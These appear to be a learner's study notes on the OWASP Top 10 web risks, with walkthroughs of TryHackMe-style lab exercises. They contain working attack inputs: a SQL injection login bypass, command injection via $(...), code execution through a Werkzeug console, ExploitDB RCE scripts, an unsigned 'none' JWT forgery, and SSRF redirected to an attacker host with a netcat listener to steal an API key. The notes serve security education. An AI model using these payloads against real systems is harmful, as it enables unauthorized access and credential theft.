The [*Open Web Application Security Project (OWASP)*](https://owasp.org) is a non-profit-organistaion dedicated to enhance the security of web services and applications

# [1. Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
Websites have pages not meant to be accessed by regular users. If the authorisation can be bypassed and these pages can be accessed the *access control* of the page is broken which can lead to:
- view sensitive information from other users
- gaining unauthorized functionality

There are two categries of *Brocken Access Control*:
- **Horizontal** Privilege Escalation: perform actions or access data of another user of the same level of permissions
- **Vertical** Privilege Escalation: perform actions or access data of another user with a higher level of permissions

## Exercise: Insecure Direct Object Reference (IDOR)
*Insecure Direct Object Referecne (IDOR)* is a access control vulnerability occuring when a *Direct Object Reference*  to a file, user, etc. is exposed and access to protected resources can be gained.

1. We log into our bank account with the username "noot" and password "test1234"
2. We get access to our account with the URL `https://bank.thm/account?id=111111` 
3. We change the `id` to `222222` and access the account of another user, because the application does not verify if we are authorized to view it.

# 2. Cryptopgraphic Failures
*Cryptographic Failures* occure when no or weak cryptographic algorithms are used to encrypt data.
For example, a secure web application:
- **encrypting data in transit**: ensure that the connection between two machines is secure and no attacker can capture network packets
- **encrypting data at rest**: data is stored in an encrypted format on a server
## Example

In this exercise we have downloaded a *flat-file* database, which is a database stored as a file on the disk of a computer. If this database is stored underneath the root directory, a attacker could download this and have access to all data.
The most common format for a *flat-file* databse is a SQLite database, which can be communicated with, using a `sqlite3` client.

```
user@linux$ file example.db
> example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```
Here we can see that the downloaded database is  a SQLite database.

1. We access the database with `sqlite3 database-name`
2. Using `.tables`, we can see the tables in the database and find the table "customers"
3. We use `PRAGMA table_info(customers);` to see the table information
```
sqlite> PRAGMA table_info(customers); 
> 0|custID|INT|1||1
  1|custName|TEXT|1||0
  2|creditCard|TEXT|0||0
  3|password|TEXT|1||0
```
4. With `SELECT * FROM customers;` we can dump all data from the table 
```
sqlite> SELECT * FROM customers;
> 0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
  1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
  2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
  3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
  4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
  5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```
5. The passwords are stored in the form of *hashes*, which we will crack with [Crackstation](https://crackstation.net/), which is usefull for weak passwords
## Exercise
1. We access the web application of the server and search the website look around the website
2. We find in the source code of the login page the note 
```
<!-- Must remember to do something better with the database than store it in /assets... -->
```
3. We navigate to `http://10.10.93.226:81/assets/` directory and download the "webapp.db" database
4. We can open a terminal and use the steps in the example above to access the data
5. We copy the password hash of the user `admin` and paste it into [Crackstation](https://crackstation.net/) and get the password `qwertyuiop`
6. We go back to the login page of the webapplication and enter the username `admin` and password `qwertyuiop`

# [3. Injection](https://owasp.org/Top10/A03_2021-Injection/)
Injection flaws are very common in web applications and occure when user input are interpreted as commands.
Some injection examples are:
- **SQL Injection**: Occurs when user input is passed to SQL queries, manipulating the outcome of these queries, which allows the attacker to access, modify and delete information in the database.
- **Command Injection**: Occurs when user input is passed to system commands, which will then be executed. 

The main defence against injection attacks is to ensure that user inout is not interpreted as queries or commands, which can be achieved with:
- **An allow list**: user input is compared to a list of safe inputs or characters and then accepted or rejected
- **Stripping input**: if the user input contains dangerous characters, they are removed before processing.

## SQL Injection
A basic example of *SQL injection* is when presented with a login, start [[Burp Suite]] and enter some text.
After the request was intercepted switch to *Burp Suite* and change the email and password field to:
```
{"email":"' or 1=1--"},{"password:"a"}
```
**How does it work?**
1. `'` closes the brackets in the SQL query
2. `OR` will return true as `1=1` is true, this tells the server the email is valid and will log us into the user with the ID 0, which is the administrator account
3. `--` is used to comment in SQL, which comments out the any restrictions on the login as they are interpreted as a comment.

**Trying to login as a User**
When we know a user's email we simply replace `' or 1=1` from abovw with the email:
```
{"email":"user@juice-sh.op'--"},{"password:"a"}
```
## Command Injection
*Command Injection* happens when server-side code (like [PHP](https://www.php.net/manual/de/index.php)) in a web application calls a function that directly interacts with the server's OS console.
The scenario: A corporation has developed a web application that lets a user input text which will be displayed on the website. They used the a simple program which calls the `cowsay` command from the servers OS console.
Let's look at the code they used and what is does:
```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
1. Check if the parameter "mooing" is set
2. The user input is assigned to the variable `$mooing`
3. Check if the prarameter "cow" is set `$cow` (this sets the displayed animal that "speaks" the user input)
4. The variable `$cow` gets what is passed through the parameter
5. The program executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`
   The `passthru` function executes a command in the OS's console and sends the output back to the browser. 

You can read the docs on `passthru()` [here](https://www.php.net/manual/en/function.passthru.php) 
### Exploiting Command Injection
To exploit the web application we take advantage of *inline commands*, a Bash feature which allows to run commands within commands. To execute inline commands use the syntax `$(command)`. When using inline commands the console will execute them first and then use the result as the parameter for the outer command.
```
echo "my username is $(whoami)"
> my username is root
```
Some commnands you should try:
- `whoami`
- `id`
- `ifconig/ip addr`
- `username -a`

### Exercise
1. We visit a page with a text field and the note "Enter your inner cow's mooing", which takes our input and displays a cow "mooing" the entered text
2. We enter `$whoami` and the text shows "apache"
3. We know now that we can inject commands and use the commands presented above to gain more informations
# 4. Insecure Design
*Insecure Design* occurs when the architecture or "idea" of an application is flawed. These can be the result of improper threat modelling during the planning phase or "shortcuts", added by developer to make testing easier and forgotten to be disabled.
## Example: Insecure Password Reset
Instagram had a vulnerability which affected the password reset. A user could reset their password by entering a 6-digit code, which was send to them by sms. An attacker could try to brute force the code, and although there was a rate limit, which blocked a user from trying after 250 attempts, but this limit only applied to one IP address. If the attacker used another IP address he could continue to brute force the 6-digit code. A 6-digit code, has a million possible codes, this would mean the attacker needs 4000 Ip addresses to cover all possible codes.
The flaw in this application is the assumption a single user is not able to use thousands of IP addresses and not based on a improper implementaion.
## Exercise
1. We know the username "joseph" and try to gain access to his account.
2. We click on the "Forgot my password" option
3. To auuthenticate our identity we need to answer one of three questions
4. We choose the question "What is your favorit color" and try to brute force the solution by entering different colors
5. After entering "green" we are presented with a new password 
6. We enter the username "joseph and the new password and have gained access to the account
# 5. Security Misconfiguration
[*Security Misconfiguration*](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) occur when Security could have been appropriately configured but was not. These can be:
- Poorly configured permissions on cloud services, like [S3](https://aws.amazon.com/de/s3/)
- Enableing unnecessary features like services,pages, accounts, privileges
- Default accounts with unchanged passwords
- Overly detailed error messages, allowing attacker to gather more information about the system
- Not using [HTTP Secure Headers](https://owasp.org/www-project-secure-headers/) 

## Debugging Interfaces
Debugging features are often available in programming frameworks, allowing developers to access advanced functionality, useful for debugging an application. If these features are exposed an attacker could abuse these functionalities.

An example of this is when [Patreon got hacked in 2015](https://labs.detectify.com/writeups/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/), where an open debug interface for a Werkzeug console was found. Werkzeug is a component in Python-based web applications, offering an interface for web servers to execute Python Code. The dubug console of Werkzeug can be accessed via URL `www.website.com/console`, but it will also be presented if an exception is raised by the application. 
## Exercise
1. We navigate to the Werkzeug console of the website at `/console`
2. We enter the code `import os; print(os.popen("ls -l").read())` to execute the `ls -l` command
3. We modify the code to read the contens of the `app.py` file, which contains the applications source code
# 6. Vulnerable and Outdated Components
Sometimes companies use programs which are outdated or vurnerable, meaning they have well known vulnerabilites.
A example would be if a company has not updated their version of WordPress. Using a tool like [WPScan](https://wpscan.com/) we find that it is the version 4.6. A quick research will reveal that this version is vulnerable to an unauthenticated remote code execution (RCE) exploit, which can be found on [ExploitDB](https://www.exploit-db.com/exploits/41962). 

Using *Vulnerable and Outdated Components* can be devastating, since their vulnerabilities are well known, exploiting them takes little efford. Because of this components should be updated as soon as possible. 
## Example
Scince the components we try to exploit already have known vulnerabilities, we only have to gather enough information to determine what exploit we can use.
1. We visit a website and are greeted with the default page for the "Nostromo" web server, displaying the version number "1.9.6".
2. Searching on ExploitDB we find an exploit for this version
3. We download the exploit and look at the code, in case parameters must be set or lines deleted and delete a line, with the comment "This line needs to be deleted."
4. We run the exploit with the command `python2 47837.py 127.0.0.1 80 id`
## Exercise
1. We visit a online book store, which uses PHP and MYSQL. 
2. We search for CVE of online book stores on ExploidDB (specifically Remote Code Execution)
3. We find the Exploit with the ID 47887
4. We run the exploit with `python3 path/to/exploit URL-of-bookstore`
5. We can now execute code and get the flag with `cat /opt/flag.txt`
# 7. Identification and Authentication Failures
Authentication and session management are core components of modern web applications. Authentication is needed when access to web applications is only allowed after entering valid credentials. These credentials are normaly a username and password, which are verified by the server and if correct the server provides a session cookie to the browser. Session cookies allow the server to know who is sending data and keeping track of the users action, as HTTP(S) is [stateless](https://www.dev-insider.de/was-bedeutet-stateless-a-3406d7b2ebc08a8c87259d74ab73b04f/).
A flaw in the authentication mechanism could enable an attacker to gain access to these restricted web applications or pages of a website.
- **Brute force attacks**: if a web application does not limit the attempts to enter valid credentials an attacker could try to brute force them
- **Using weak passwords**: when weak passwords, such as "password1" are allowed, it is easy for an attacker to guess or crack them
- **Using weak session cookies**: if the session cookies contain predictable values, an attacker could set their own session cookies and access a users acount.

To keep an authentication mechanism safe you should:
- enforce a strong password policy, to avoid password- guessing attacks
- ensure an automatic lockout after a set number of login attempts to prevent brute force attacks
- implement Multi-Factor Authentication, adding for example receiving a code on your smartphone after entering your username and password
## Exercise
We want to enter the account of `darren`, we use an exploit by re-registrating an existing user.
1. We register a new account with the username `" darren"` (notice the space at the beginning)
2. We login with our username and password and have access to `darren`'s account
# 8. Software and Data Integrity Failures
Integrity refers to the concept that data has not been modified. As a means to check that downloaded data has not been modified or damaged *hashes* are often sent along. A *hash* or *digest* is the result of a hashing algorithm, such as MD5, SHA1, SHA256, etc., which takes a input and outputs a number of a set length. If a single bit is changed the hash will be different.
In Linux you can calculate the hash of a file with:
```
user@Linux$ md5sum fileName
user@Linux$ sha1sum fileName
user@Linux$ sha256sum fileName
```
*Software and Data Integrity Failures* occure when code or infrastructure do not use any kind of integrity checks, which could allow an attacker to modify data without being detected.
## Software Integrity Failures
An example for a *Software Integrity Failure* would be if a web application uses third party software or libraries stored on a server outside of their control and no integrity checks are implemented. If an attacker gains access to the third party and inserts malicious code, the web application will now use malicious code which could also affect anyone who visits the website. 

Modern browser allow to specify a hash along the library's URL to check the integrity of the library and only execute the code only if the downloaded hash matches the hash send by the library. This mechanism is called *Subresource Integrity (SRI)*.
## Data Integrity Failures
Web application will usually assign session tokens to idetify the user and his behavior´. These session tokens usually take the form of [*cookies*](https://de.wikipedia.org/wiki/HTTP-Cookie). These cookies could contain the username of a user and in each subsequent request the cookie will be send to the server. Without integrity checks someone could change the username in the cookie, as they are stored in the browser, and impersonate another user. 
One implementation of an integrity check is [*JSON Web Tokens (JWT)*](https://datatracker.ietf.org/doc/html/rfc7519). JWTs allow you to store key-value pairs on tokens, which provide integrity. These tokens ensure that users can not alter the key-value pair and pass the integrity check. 
The structure of a JWT token consists of 3 parts, seperated by a `.`:
- **Header**: contains metadata and the signing algorithm
- **Payload**: contains the key-value pairs and data the application wants the client to store
- **Signature**: similar to a hash used to check the payload's integrity

The 3 parts are plaintext encoded with [*Base64*](https://de.wikipedia.org/wiki/Base64), which can be decoded with tools like [this](https://appdevtools.com/base64-encoder-decoder).
Remember that the signature contains binary data, even decoded it will not make sense.
**Example**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
```

| Part          | Encoded                                            | Decoded                                   |
| ------------- | -------------------------------------------------- | ----------------------------------------- |
| **Header**    | eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9               | {"typ":"JWT","alg":"HS256"}               |
| **Payload**   | eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ | {"username":"guest",<br>"exp":1665076836} |
| **Signature** | C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw        | Æwð>K¼E(¨%`IyÄêaØ*H\juL          |
### JWT and the None Algorithm
A vulnerability was present on some libraries impelenting JWTs, which allowed attackers to bypass the signature validation by:
- modifying the header section `alg` to the value `none`
- removing the signature part

**Example**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY1MDc2ODM2fQ
```

| Part        | Encoded                                            | Decoded                                   |
| ----------- | -------------------------------------------------- | ----------------------------------------- |
| **Header**  | eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0                | {"typ":"JWT","alg":"none"}                |
| **Payload** | eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY1MDc2ODM2fQ | {"username":"admin",<br>"exp":1665076836} |
## Exercise 
1. We try to login a web application as a guest, but the account is password protected
2. After entering wrong credentials we are given the message that we can login with the usename "guest" and the password "guest"
3. After logging in we open the developer tools of the browser (`F12`) and navigate to "Storage" to inspect the cookies
4. We now have a cookie from the website with the name "jwt-session" ```
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE0NzQzNDY4fQ.pzoaWy33LLOPdlfQ-EAIjf7YrbU0qyXLUqSMzCBNkLc
```
5. By double-clicking on the "value" field we can modify the contents
6. We use the [Base64 Tool](https://appdevtools.com/base64-encoder-decoder) to encode the modified cookie 
	```
	eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE1MTY2NDgzfQ.
	```
7. We reload the website and if the cookie where modified correctly we get access to the flag

# 9. Security Logging and Monitoring Failures
Every action by a user, inside a web application, should be logged. This is important because when an attack occurs, the actvities of him can be traced and the impact determined. 
Without logging there could be:
- **Regulatory damage**: if the attacker gained access to personal data and there is no record, the users are affected and the application owner may be subject to fines or more severe regulations
- **Risk of further attacks**: if the attacker and his actions are undected, this could allow the attacker to launch further attacks.

Logs should include:
- HTTP status codes
- Time stamps
- Usernames
- API endpoints/page locations
- IP addresses

Logging is very important after an attack occured, as monitoring should be in place to detect and stop suspicious activities.
Suspicious activities includes:
- Multiple unauthorised attempts for particular actions, such as login attempts or access to unauthorised resouces (admin pages, etc.)
- Requests from anomalous IP addresses or locations
- Use of automated tools, which can be identified by the value of User-Agent headers or the speed of requests
- Using common known payloads

## Exercise
# 10. Server-Side Request Forgery (SSRF)
A basic example of *SSRF* would be when a web application exposes a server parameter, for example:
```
http://www.examplesite.com/sms?server=srv3.sms.thm&msg=hello
```
An attacker could change the value of the `server` to point to their own machine.
```
http://www.examplesite.com/sms?server=attacker.thm&msg=hello
```
The web application would than forward the server request to the attacker, who would optain the *API key*. The *API key* is a secret key used as an authentication token when a application uses a external API.

To capture the content of the request you can use Netcat:
```
nc -lvp 80
```

*SSRF* can be used to:
- Enumerate internal networks, including IP addresses and ports
- Gain access to restricted services
- Interact with non-HTTP services to get *Remote Code Execution (RCE)*
## Exercise 
1. We visit the target web page and find a "Download Resume" button which exposes the URL of the server where the Resume is stored
```
	http://10.10.193.204:8087/download?server=secure-file-storage.com:8087&id=75482342
```
1. We copy the link and change the server to our own IP
```
	10.10.193.204:8087/download?server=10.10.159.223:8087&id=75482342
```
1. We start a netcat listener on the port specified in the URL
```
	nc -lvp 8087
```
1.  We should then get the API key and the flag
```
Connection from ip-10-10-193-204.eu-west-1.compute.internal 36210 received!
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.10.159.223:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**Bonus Exercise**
We try to use *SSRF* to get access to the admin area of the web site.
One way is to modify the URL to download the Resume
```
10.10.193.204:8087/download?server=localhost:8087/admin%23&id=75482342
```
Changing the server parameter to `localhost:8087/admin` results in a request to the localhost on the given port and the admin page is displayed. The `%23` is URL encoded `#` which commands out the rest of the URL which may not be needed for access.
